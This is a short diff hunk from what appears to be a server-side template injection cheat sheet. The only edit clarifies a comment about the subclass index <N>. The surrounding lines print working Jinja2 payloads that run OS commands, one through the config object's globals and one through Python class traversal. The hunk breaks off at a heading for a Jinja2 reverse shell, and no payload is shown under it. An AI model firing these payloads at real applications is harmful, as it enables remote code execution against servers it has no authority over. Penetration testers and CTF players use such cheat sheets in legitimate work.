@@ -412,7 +412,7 @@ ${7*7}            → 49 = Freemarker / Mako
 # Basic OS command execution
 {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
 
-# Class traversal RCE (when config is blocked)
+# Class traversal RCE (when config is blocked). The <N> is the index number of the subclasses list
 {{''.__class__.__mro__[1].__subclasses__()[<N>].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
 
 # Reverse shell via Jinja2
